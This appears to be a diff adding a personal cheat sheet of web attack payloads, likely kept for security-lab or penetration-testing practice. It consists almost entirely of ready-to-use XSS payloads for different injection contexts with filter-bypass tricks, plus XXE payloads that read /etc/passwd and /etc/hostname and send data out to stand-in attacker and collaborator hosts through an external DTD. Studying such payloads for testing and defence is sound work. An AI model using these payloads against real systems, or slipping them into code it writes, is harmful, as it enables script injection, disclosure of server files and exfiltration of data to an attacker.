@@ -1,0 +1,87 @@
+In a Script tag
+</script> <img src=1 onerror=alert()>
+Breaking out of a JavaScript string
+'-alert()-'
+';alert()//
+'-alert()-'
+</scrscriptipt><scrscriptipt>alert()</scrscriptipt>
+\'-alert(1)];//- bypassing escape characters -in an array ] closes the array
+</script><script>alert()</script>
+${alert()} bypassing filters
+
+'];alert();//
+\'-alert(1)];//
+</scrscriptipt><scrscriptipt>alert()</scrscriptipt>
+${alert(document.domain)} bypassing string literals `input here` 
+'];<SOME_JSFUCK_PAYLOAD>;//
+
+
+Inside HTML Attribute HREF
+" onerror="alert()"
+#"><img src="a" onerror="alert()"></a> -Does a tag need to be closed?
+"/><img src=x onerror="alert()"/>
+ <img style="max-width:20%" src="x" onerror=alert()"/>
+x" onerror=alert()//
+" onerror="alert()"
+static/img/Scanny.png" onload = "alert()
+x" oneronerrorror=alert()//
+javascript:alert() -when there is filtering
+"/><img src=x onerror="alert()"/>
+
+&apos;-alert()-&apos;
+
+lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped
+
+http://foo?&apos;-alert(1)-&apos;
+The &apos; sequence is an HTML entity representing an apostrophe or single quote. Because the browser HTML-decodes the value of the onclick attribute before the JavaScript is interpreted, the entities are decoded as quotes, which become string delimiters, and so the attack succeeds
+
+
+XSS in JavaScript template literals
+<script>
+...
+var input = `controllable data here`;
+...
+</script>
+
+${alert(document.domain)}
+
+Between HTML tags
+<IMG onmouseover="alert('yourtext')">
+<img src=x onerror="alert()"/>
+<script>alert(alert)</script>
+<a onmouseover="alert()">Text Here</a>
+<a onpointermove=alert(yourtext)>yourtext</a>
+
+<><img src=1 onerror=alert(1)>
+
+
+All In Band payloads
+
+<!DOCTYPE foo>
+<input>normal</input>
+
+<!DOCTYPE foo [<!ENTITY toreplace "my-value"> ]>
+<input>&toreplace;</input>
+
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<input>&xxe;</input>
+
+<input xmlns:xi="http://www.w3.org/2001/XInclude">
+    <xi:include parse="text" href="file:///etc/passwd"/>
+</input>
+
+OOB Payloads
+
+<input xmlns:xi="http://www.w3.org/2001/XInclude">
+    <xi:include parse="text" href="http://COLLABORATOR_HOST/"/>
+</input>
+
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://ATTACKER_HOST/exfil1.dtd"> %xxe; ]>
+<input>test</input>
+
+Payload that gets uploaded to your server
+
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://collab/ ?hostname=%file;'>">
+%eval;
+%exfil;
